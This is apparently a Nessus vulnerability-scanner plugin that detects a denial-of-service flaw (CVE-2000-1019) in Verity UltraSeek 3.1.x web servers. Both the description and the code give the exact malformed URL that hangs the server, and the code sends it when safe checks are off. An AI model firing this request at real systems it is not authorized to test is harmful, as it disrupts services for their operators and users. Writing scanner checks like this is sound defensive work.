#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10542);
 script_version("$Revision: 1.29 $");
 script_cvs_date("$Date: 2014/05/27 00:12:53 $");

 script_cve_id("CVE-2000-1019");
 script_bugtraq_id(1866);
 script_osvdb_id(441);

 script_name(english:"Verity UltraSeek 3.1.x Malformed URL Remote DoS");
 script_summary(english:"Hangs the remote UltraSeek server for some time");

 script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote UltraSeek server hang temporarily by
requesting :

/index.html?&col=&ht=0&qs=&qc=&pw=100%25&ws=0&nh=10&lk=1&rf=0&si=1&si=1&ql=../../../index

An attacker may use this flaw to prevent this site from responding to
valid client requests.");
 script_set_attribute(attribute:"solution", value:"Upgrade to UltraSeek 4.x");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/10/30");
 script_set_attribute(attribute:"patch_publication_date", value:"2000/10/23");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/11/01");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2014 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports(8765);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = 8765;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
  banner = get_http_banner(port:port);
  if("UltraSeek/3.1" >< banner)
     security_warning(port:8765, extra:
"*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.");
  exit(0);
}

if (report_paranoia < 2) audit(AUDIT_PARANOID);

r = http_send_recv3(port: 8765, item: "/", method: 'HEAD');
if(r[0] =~ "^HTTP/[0-9.]+ 200 ")
{
 r = http_send_recv3(port: 8765, method: 'GET',
   item:"/index.html?&col=&ht=0&qs=&qc=&pw=100%25&ws=0&nh=10&lk=1&rf=0&si=1&si=1&ql=../../../index");
 if (isnull(r) || !r[0]) security_warning(8765);
}
